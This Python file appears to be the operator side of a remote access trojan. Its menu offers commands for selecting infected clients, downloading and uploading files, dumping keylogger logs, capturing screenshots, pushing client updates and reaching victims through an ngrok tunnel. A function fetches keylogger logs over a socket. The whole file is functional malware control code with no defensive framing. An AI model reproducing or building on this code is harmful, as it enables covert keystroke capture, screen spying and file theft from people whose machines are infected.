import os, sys
import socket

from config.local import HOST
from services.file_transfer import *

WIN = sys.platform == "win32"
CURRENT_DIR = os.getcwd()
TEMP_DIR = os.environ["TEMP"] if WIN else "/tmp"


def clear():
    os.system("cls") if WIN else os.system("clear")


def help(ngip, ngport):
    clear()
    print('_'*65)
    print('exit                        -    returns server interface')
    print('cls                         -    clears the output on server')
    print('startup                     -    gets client start folder path')
    print('list | ls                   -    list all connections available')
    print('select id                   -    select a client by id')
    print('"."                         -    select the first one')
    print('download file -o outfile    -    downloads a file')
    print('upload   file               -    uploads a file')
    print('dumplog                     -    get keylogger logs from client')
    print('temp                        -    move to temp folder')
    print('speak msg                   -    send a text to client to be speaked')
    print('scr | print                 -    get screenshot on the client')
    print('update-server               -    update server ip / port')
    print('send update                 -    send an updated msrvc version to client')
    print('restart                     -    restarts client connection')
    print('shutdown                    -    shutdown client connection')
    print(65*'_')
    print(f'Local Address: {HOST[0]}:{HOST[1]}')
    print(f'Ngrok tunnel: {ngip}: {ngport}')
    print('_'*65)

def get_logs_from_client(target: socket, command: str) -> None:
    target.send("dumplog".encode(UTF))
    log_path = target.recv(1024).decode(UTF)
    if log_path:
        command = command.replace("dumplog", "").strip()
        command = f"download {log_path}"
        file_download(command, target)
